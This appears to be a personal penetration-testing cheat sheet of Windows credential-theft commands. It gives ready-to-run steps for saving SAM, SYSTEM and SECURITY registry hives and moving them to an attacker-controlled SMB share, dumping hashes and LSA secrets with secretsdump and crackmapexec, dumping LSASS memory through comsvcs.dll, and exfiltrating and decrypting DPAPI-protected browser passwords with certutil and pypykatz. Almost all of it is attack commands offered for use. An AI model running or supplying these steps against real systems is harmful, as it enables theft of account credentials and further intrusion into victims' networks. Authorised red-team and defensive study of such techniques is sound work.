# Windows - Exploitation tips

% windows

## Manual SAM db dumping
```
# copy registry hives
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

# create a share with smbserver.py
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support <SHARENAME> <PATH TO FOLDER>

# Move hive copies to share
move <FILE> \\<ATK IP>\<SHARENAME>

# dump hashes with secretsdump
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# if necessary, crack hashes
```

## Remote LSA dumping
```
# Remote LSA dump
crackmapexec smb <TARGET IP> --local-auth -u <USER> -p <PASSWORD> --lsa
```

## Remote SAM dumping
```
# Remote SAM dump

crackmapexec smb <TARGET IP> --local-auth -u <USER> -p <PASSWORD> --sam
```

## LSASS dumping
```
# dumping LSASS
# 1. Find lsass.exe pid
# CMD
tasklist /svc
# Pwsh
Get-Process lsass

# 2. Create a dump, pwsh
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

# 3. Pypykatz to extract creds
pypykatz lsa minidump <PATH/TO/DUMP>

# 4. Look at the MSV? WDIGEST, KERBEROS, DPAPI sections
# 5. Crack if necssary
```

# Decrypt secrets using a user's DPAPI master key + compromised user's password
```
# Addendum : DPAPI master key
# Those are encrypted using a user-specific master key derived from the user's secret
1. Download locally the encrypted user's DPAPI master key
- Location : C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
- Note the user's SID for later use
- use 'gci -force' to list
  - Usually there are 2 files named using a U=GUID
    - one is the DPAPI secret encrypted using the Domain key
    - the other, what we want, is the same but encrypted using the user's key
- if you are using powershell in constrainted mode and .NET scripting is not possible, use a LOLBIN to retrieve the 2 files :
  - b64 encode DPAPI secret : certutil -encode <GUID name file> <GUID name file>.b64
  - gc <UUID name file>.b64 > copy the file content locally
  - 'b64 -d' the file 

2. Download stored DPAPI encrypted blobs
- Common locations :
C:\Users\$USER\AppData\Local\Microsoft\Credentials\
C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
- Edge :
C:\Users\$USER\AppData\Local\Microsoft\Edge\User Data\Default\Login Data

Encode using certutil an exfiltrate + b64 decode

3.(Optional) Identify the b64 blobs encrypted by the DPAPI key within the retrived files + b64 decrypt
Check the DPAPI magic bytes at the beginning of the blobs to validate this steps
4. Decrypt the blobs using pypykatz
pypykatz dpapi describe blob <blob name> > note the masterkey_guid and use the corresponding DPAPI secret blob for the given blob for the next steps.
- generate prekey using password
pypykatz dpapi prekey password <UserSID> <User's password> > <Prekey file>
- Decrypt the DPAPI master key file
pypykatz dpapi <DPAPI master key file with GUID name> <Prekey file> -o masterkey_file
- Decrypt encrypted blob, example chrome:
pypykatz dpapi chrom --logindata Login.sqlite masterkey_file state

```
